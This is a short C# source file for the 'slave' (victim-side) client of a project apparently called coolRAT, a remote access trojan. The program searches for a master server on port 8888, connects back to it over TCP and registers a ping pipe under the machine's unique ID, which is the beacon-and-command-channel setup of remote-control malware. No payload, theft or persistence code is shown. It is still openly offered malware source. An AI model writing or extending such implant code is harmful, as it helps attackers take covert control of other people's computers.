using coolRAT.Libs;
using coolRAT.Libs.Packets;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace coolRAT.Slave
{
    class Program
    {
        static void Main(string[] args)
        {
            MasterServerInfo MasterServerInfo;
            Client Me;
            MasterFinder.RunInit(new ConnectionSettings(8888));
            Console.WriteLine("-- Master Finder running");
            while(true)
            {
                MasterServerInfo inf = MasterFinder.ConnectToMasterServer();
                if (!inf.IsEmpty)
                {
                    MasterServerInfo = inf;
                    Me = inf.LocalClient;
                    break;
                }
            }
            // Connect the ping service
            TcpConnection conn = new TcpConnection();
            conn.Connect(MasterServerInfo.RemoteServer.Address.ToString(), MasterServerInfo.RemoteServer.Port);
            ConnectPipePacket connect_packet = new ConnectPipePacket(Me.UniqueId, PipeType.Ping);
            conn.SendPacket(connect_packet);
            string packet_raw = conn.ReadPacket();
            PipeConnectedPacket connectedPacket = PipeConnectedPacket.Deserialize(packet_raw);
            if(connectedPacket.Success)
            {
                Console.WriteLine("Ping service pipe connected");
                Me.Pipes.PingPipe = conn;
            }
            else
            {
                Console.WriteLine("Failed to connect to the main server");
                return;
            }
            Console.WriteLine("Connected to the master server!");
            Console.ReadLine();
        }
    }
}
